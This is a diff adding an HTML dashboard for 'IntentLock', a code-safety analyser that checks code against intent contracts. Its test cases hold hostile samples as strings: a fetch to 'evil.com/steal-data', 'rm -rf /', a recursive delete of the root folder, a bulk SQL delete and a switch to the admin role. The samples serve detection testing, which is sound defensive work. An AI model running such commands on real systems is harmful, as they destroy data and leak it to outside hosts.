@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IntentLock - Security Analysis Dashboard (Enhanced)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        header h1 {
+            font-size: 2em;
+            margin-bottom: 5px;
+        }
+
+        header p {
+            opacity: 0.9;
+        }
+
+        .content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            padding: 30px;
+        }
+
+        .panel {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            background: #f9f9f9;
+        }
+
+        .panel h2 {
+            font-size: 1.2em;
+            margin-bottom: 15px;
+            color: #333;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 10px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 150px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            resize: vertical;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 10px;
+            width: 100%;
+            transition: transform 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .result-section {
+            margin-top: 20px;
+            padding: 15px;
+            background: white;
+            border-radius: 5px;
+            border-left: 4px solid #667eea;
+        }
+
+        .result-section.safe {
+            border-left-color: #4CAF50;
+            background: #f1f8f4;
+        }
+
+        .result-section.unsafe {
+            border-left-color: #f44336;
+            background: #fef1f0;
+        }
+
+        .result-section h3 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .violation {
+            background: #fff3cd;
+            border-left: 3px solid #ff6b6b;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+
+        .violation.critical {
+            background: #f8d7da;
+            border-left-color: #721c24;
+        }
+
+        .violation.high {
+            background: #fff3cd;
+            border-left-color: #856404;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin: 10px 0;
+        }
+
+        .stat {
+            background: white;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            border: 1px solid #ddd;
+        }
+
+        .stat-value {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #667eea;
+        }
+
+        .stat-label {
+            font-size: 0.85em;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .logging-info {
+            font-size: 11px;
+            color: #666;
+            background: #f0f0f0;
+            padding: 8px;
+            border-radius: 3px;
+            margin-top: 10px;
+        }
+
+        .grid-full {
+            grid-column: 1 / -1;
+        }
+
+        @media (max-width: 768px) {
+            .content {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔒 IntentLock Dashboard</h1>
+            <p>Semantic Security Analysis & Intent Contract Verification</p>
+        </header>
+
+        <div class="content">
+            <!-- LEFT PANEL: Input -->
+            <div class="panel">
+                <h2>📝 Intent Definition</h2>
+                
+                <label>Intent Name</label>
+                <input type="text" id="intentName" placeholder="e.g., 'User API Endpoint'" value="Test Intent">
+
+                <label>Intent Prompt</label>
+                <textarea id="intentPrompt" placeholder="Describe the intended behavior...">
+A simple API endpoint that fetches user data from our database. No external network calls, no file system access.</textarea>
+
+                <h2 style="margin-top: 20px;">💻 Code to Analyze</h2>
+                <textarea id="codeToAnalyze" placeholder="Paste code here...">
+const express = require('express');
+const app = express();
+
+app.get('/api/users', (req, res) => {
+  const users = [{ id: 1, name: 'Alice' }];
+  res.json(users);
+});
+</textarea>
+
+                <button onclick="analyzeCode()">🔍 Analyze Code</button>
+                <button onclick="verifyCode()" style="background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%); margin-top: 5px;">✅ Full Verification</button>
+                <button onclick="clearLogs()" style="background: #999; margin-top: 5px;">🧹 Clear Logs</button>
+
+                <div class="logging-info">
+                    ℹ️ <strong>Console Logging Enabled:</strong> Open DevTools (F12) → Console to see detailed pipeline logs
+                </div>
+            </div>
+
+            <!-- RIGHT PANEL: Results -->
+            <div class="panel">
+                <h2>📊 Analysis Results</h2>
+                <div id="resultsArea">
+                    <p style="color: #999; text-align: center;">Results will appear here...</p>
+                </div>
+            </div>
+
+            <!-- FULL WIDTH: Test Cases -->
+            <div class="panel grid-full">
+                <h2>🧪 Test Cases (Click to Run)</h2>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px;">
+                    <button onclick="runTest('malicious_fetch')" style="background: #f44336;">Test 1: Evil Domain Fetch</button>
+                    <button onclick="runTest('recursive_delete')" style="background: #f44336;">Test 2: Recursive Delete</button>
+                    <button onclick="runTest('shell_exec')" style="background: #f44336;">Test 3: Shell Command</button>
+                    <button onclick="runTest('bulk_delete')" style="background: #f44336;">Test 4: Bulk DB Delete</button>
+                    <button onclick="runTest('privilege_escalation')" style="background: #f44336;">Test 5: Privilege Escalation</button>
+                    <button onclick="runTest('safe_code')" style="background: #4CAF50;">Test 6: Safe Code</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ====================================================================
+        // ENHANCED CONSOLE LOGGING
+        // ====================================================================
+        const originalLog = console.log;
+        const originalError = console.error;
+
+        function log(...args) {
+            originalLog(...args);
+            addToConsole('log', args.join(' '));
+        }
+
+        function logError(...args) {
+            originalError(...args);
+            addToConsole('error', args.join(' '));
+        }
+
+        // Override console methods
+        console.log = log;
+        console.error = logError;
+
+        // ====================================================================
+        // TEST CODE SAMPLES
+        // ====================================================================
+        const testCases = {
+            malicious_fetch: {
+                name: '❌ Malicious Network Call',
+                prompt: 'No external network calls allowed',
+                code: `const fetch = require('fetch');
+fetch('https://evil.com/steal-data');`
+            },
+            recursive_delete: {
+                name: '❌ Recursive Filesystem Delete',
+                prompt: 'No recursive file deletion allowed',
+                code: `const fs = require('fs');
+fs.rm('/', { recursive: true });`
+            },
+            shell_exec: {
+                name: '❌ Destructive Shell Execution',
+                prompt: 'No shell execution allowed',
+                code: `const { exec } = require('child_process');
+exec('rm -rf /');`
+            },
+            bulk_delete: {
+                name: '❌ Bulk Database Delete',
+                prompt: 'No bulk database operations allowed',
+                code: `const db = require('database');
+db.query('DELETE FROM users;');`
+            },
+            privilege_escalation: {
+                name: '❌ Privilege Escalation',
+                prompt: 'No privilege escalation allowed',
+                code: `const user = getCurrentUser();
+user.role = 'admin';`
+            },
+            safe_code: {
+                name: '✅ Safe Code',
+                prompt: 'Simple API endpoint with basic GET request',
+                code: `const express = require('express');
+const app = express();
+app.get('/api/data', (req, res) => {
+  res.json({ data: 'safe' });
+});`
+            }
+        };
+
+        // ====================================================================
+        // MAIN ANALYSIS FUNCTIONS
+        // ====================================================================
+        async function analyzeCode() {
+            const code = document.getElementById('codeToAnalyze').value;
+            const intentName = document.getElementById('intentName').value;
+            
+            console.log('\n╔════════════════════════════════════════╗');
+            console.log('║  INTENTLOCK ANALYSIS STARTED            ║');
+            console.log('╚════════════════════════════════════════╝\n');
+
+            try {
+                const response = await fetch('http://localhost:3000/analyze', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        code: code,
+                        contract: {
+                            intent_name: intentName,
+                            forbidden_actions: [
+                                'outbound_network_calls',
+                                'file_system_access',
+                                'child_process_execution',
+                                'hardcoded_secrets'
+                            ],
+                            intent_constraints: {
+                                allow_bulk_operations: false,
+                                allow_recursive_delete: false,
+                                allow_shell_execution: false,
+                                allow_external_network_calls: false,
+                                allow_privilege_escalation: false,
+                                max_risk_level: 'MEDIUM'
+                            }
+                        }
+                    })
+                });
+
+                const result = await response.json();
+                console.log('\n✅ Analysis Complete:', result);
+                displayResults(result);
+
+            } catch (error) {
+                console.error('Analysis failed:', error);
+                displayError(error);
+            }
+        }
+
+        async function verifyCode() {
+            const code = document.getElementById('codeToAnalyze').value;
+            const prompt = document.getElementById('intentPrompt').value;
+
+            console.log('\n╔════════════════════════════════════════╗');
+            console.log('║  FULL VERIFICATION PIPELINE            ║');
+            console.log('╚════════════════════════════════════════╝\n');
+
+            try {
+                const response = await fetch('http://localhost:3000/verify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code, prompt })
+                });
+
+                const result = await response.json();
+                console.log('\n✅ Verification Complete:', result);
+                displayFullResults(result);
+
+            } catch (error) {
+                console.error('Verification failed:', error);
+                displayError(error);
+            }
+        }
+
+        // ====================================================================
+        // RESULT DISPLAY
+        // ====================================================================
+        function displayResults(data) {
+            const resultsArea = document.getElementById('resultsArea');
+            const safeStatus = data.safe ? 'SAFE' : 'UNSAFE';
+            const safeClass = data.safe ? 'safe' : 'unsafe';
+
+            let html = `
+                <div class="result-section ${safeClass}">
+                    <h3>📋 Analysis Result: <strong>${safeStatus}</strong></h3>
+                    
+                    <div class="stats">
+                        <div class="stat">
+                            <div class="stat-value">${data.violations_count}</div>
+                            <div class="stat-label">Violations</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value">${data.severity_breakdown.CRITICAL || 0}</div>
+                            <div class="stat-label">Critical</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value">${data.severity_breakdown.HIGH || 0}</div>
+                            <div class="stat-label">High</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value">${data.semantic_operations.length}</div>
+                            <div class="stat-label">Operations</div>
+                        </div>
+                    </div>
+            `;
+
+            if (data.violations && data.violations.length > 0) {
+                html += '<h4 style="margin-top: 15px;">⚠️ Violations Detected:</h4>';
+                data.violations.slice(0, 5).forEach(v => {
+                    html += `<div class="violation ${v.severity.toLowerCase()}">
+                        <strong>[${v.severity}]</strong> ${v.detail}
+                    </div>`;
+                });
+            }
+
+            html += '</div>';
+            resultsArea.innerHTML = html;
+        }
+
+        function displayFullResults(data) {
+            const resultsArea = document.getElementById('resultsArea');
+            const safeStatus = data.safe ? 'SAFE' : 'UNSAFE';
+            const safeClass = data.safe ? 'safe' : 'unsafe';
+
+            let html = `
+                <div class="result-section ${safeClass}">
+                    <h3>✅ Full Verification: <strong>${safeStatus}</strong></h3>
+                    <p>${data.summary}</p>
+                    
+                    <div class="stats">
+                        <div class="stat">
+                            <div class="stat-value">${data.violations.length}</div>
+                            <div class="stat-label">Violations</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value">${data.behavior.semantic_operations_count}</div>
+                            <div class="stat-label">Operations</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value">${data.behavior.risk_summary.CRITICAL || 0}</div>
+                            <div class="stat-label">Critical Ops</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value">${data.behavior.network_calls}</div>
+                            <div class="stat-label">Network Calls</div>
+                        </div>
+                    </div>
+            `;
+
+            if (data.violations && data.violations.length > 0) {
+                html += '<h4 style="margin-top: 15px;">Detected Violations:</h4>';
+                data.violations.slice(0, 5).forEach(v => {
+                    html += `<div class="violation ${v.severity.toLowerCase()}">
+                        <strong>[${v.severity}]</strong> ${v.detail}
+                    </div>`;
+                });
+            }
+
+            html += '</div>';
+            resultsArea.innerHTML = html;
+        }
+
+        function displayError(error) {
+            const resultsArea = document.getElementById('resultsArea');
+            resultsArea.innerHTML = `
+                <div class="result-section">
+                    <h3>❌ Error</h3>
+                    <p>${error.message}</p>
+                    <div class="logging-info">
+                        Make sure the backend server is running on http://localhost:3000
+                    </div>
+                </div>
+            `;
+        }
+
+        // ====================================================================
+        // TEST RUNNER
+        // ====================================================================
+        function runTest(testKey) {
+            const test = testCases[testKey];
+            if (!test) return;
+
+            console.log(`\n🧪 Running Test: ${test.name}`);
+
+            document.getElementById('intentName').value = test.name;
+            document.getElementById('intentPrompt').value = test.prompt;
+            document.getElementById('codeToAnalyze').value = test.code;
+
+            // Run analysis after UI update
+            setTimeout(() => analyzeCode(), 100);
+        }
+
+        function clearLogs() {
+            console.clear();
+            console.log('🧹 Console cleared');
+        }
+
+        function addToConsole(type, message) {
+            // Implement if you want to display console output in the UI
+            // For now, logs only go to browser console
+        }
+
+        // ====================================================================
+        // INITIALIZATION
+        // ====================================================================
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('🚀 IntentLock Dashboard Ready');
+            console.log('📍 Backend URL: http://localhost:3000');
+            console.log('💡 Tip: Select test cases to see dangerous code detection in action');
+        });
+    </script>
+</body>
+</html>
